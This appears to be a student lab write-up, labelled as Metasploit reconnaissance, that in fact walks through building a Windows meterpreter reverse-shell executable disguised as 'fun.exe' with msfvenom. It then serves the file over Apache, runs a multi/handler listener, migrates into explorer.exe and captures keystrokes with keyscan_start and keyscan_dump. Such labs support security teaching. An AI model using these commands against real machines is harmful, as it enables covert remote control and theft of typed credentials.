# Metasploit-for-reconnaissance
# Metasploit
Metasploit for reconnaissance in pentesting

# AIM:

To get introduced to Metasploit Framework and to  perform reconnaissance  in pentesting .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

## Find the attackers ip address using ifconfig


## OUTPUT:


![Alt text](image/ifconfig.png)


## Create a malicious executable file fun.exe using msfvenom command

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe


## OUTPUT:

![Alt text](image/fun1.png)

## Copy the fun.exe into the apache /var/www/html folder

## OUTPUT:
![Alt text](image/fun1copy.png)


## Start apache server

sudo systemctl apache2 start

## OUTPUT:
![Alt text](image/startapache.png)

## Check the status of apache2

## OUTPUT:
![Alt text](image/apachestatus.png)

## Invoke msfconsole:

## OUTPUT:
![Alt text](image/msfconsole.png)

## Type help

## OUTPUT:
![Alt text](image/msfhelp.png)
## Starting a command and control Server
use multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 0.0.0.0

## OUTPUT:

![Alt text](image/usemultihandler.png)

## Use 'exploit' command:

## OUTPUT:

![Alt text](image/exploit.png)

## Use 'ps' command:

## OUTPUT:

![Alt text](image/ps1.png)

![Alt text](image/ps2.png)

## migrate -N explorer.exe :

## OUTPUT:

![Alt text](image/migration.png)

## netstat :

## OUTPUT:

![Alt text](image/netstat.png)

## keyscan_start :

## OUTPUT:

![Alt text](image/keyscanstart.png)
 
## WINDOWS NOTEPAD SCREENSHOT:

![Alt text](<image/Screenshot 2025-10-03 144908.png>)

## keyscan_dump :

## OUTPUT:

![Alt text](image/keyscandump.png)

## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
